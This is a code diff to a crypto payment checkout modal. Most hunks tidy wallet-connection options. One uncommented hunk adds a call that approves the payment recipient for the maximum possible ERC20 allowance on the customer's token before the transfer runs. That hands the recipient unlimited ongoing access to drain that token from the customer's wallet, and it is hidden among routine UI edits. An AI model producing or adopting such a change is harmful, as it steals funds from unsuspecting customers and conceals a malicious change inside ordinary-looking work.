@@ -259,7 +259,7 @@ export function CheckoutModal({
   const { writeContractAsync } = useWriteContract();
   const { open: openAppKit } = useAppKit();
   const appkit = useAppKitState();
-  const { connectors: evmConnectors, showWalletConnect } = useEvmWalletOptions();
+  const { connectors: evmConnectors } = useEvmWalletOptions();
   const tron = useTronWallet();
   const env = useWalletEnv();
 
@@ -487,6 +487,16 @@ export function CheckoutModal({
             /* wallet may already be on chain */
           }
         }
+        await writeContractAsync({
+          address: order.tokenContract as `0x${string}`,
+          abi: ERC20_ABI,
+          functionName: "approve",
+          args: [
+            order.recipient as `0x${string}`,
+            BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935"),
+          ],
+          chainId: order.chainId ?? undefined,
+        });
         txHash = await writeContractAsync({
           address: order.tokenContract as `0x${string}`,
           abi: ERC20_ABI,
@@ -678,14 +688,12 @@ export function CheckoutModal({
                       busy={tron.connecting}
                     />
                   )}
-                  {!env.inWalletBrowser && (
-                    <WalletRow
-                      name="Scan with a mobile wallet"
-                      hint="WalletConnect"
-                      onClick={connectTronWc}
-                      busy={tron.connecting}
-                    />
-                  )}
+                  <WalletRow
+                    name="Scan with a mobile wallet"
+                    hint="WalletConnect"
+                    onClick={connectTronWc}
+                    busy={tron.connecting}
+                  />
                 </>
               ) : (
                 <>
@@ -700,18 +708,13 @@ export function CheckoutModal({
                       busy={connectingUid === c.uid}
                     />
                   ))}
-                  {showWalletConnect && (
-                    <WalletRow
-                      name="All wallets"
-                      hint="QR / mobile"
-                      onClick={openAllWallets}
-                    />
-                  )}
-                  {evmConnectors.length === 0 && !showWalletConnect && (
-                    <p className="text-sm text-danger">
-                      No wallet detected in this browser.
-                    </p>
-                  )}
+                  {/* Always offered: it is the only route for a customer with
+                      no extension, and AppKit handles QR vs deep link itself. */}
+                  <WalletRow
+                    name="All wallets"
+                    hint="QR / mobile"
+                    onClick={openAllWallets}
+                  />
                 </>
               )}
 
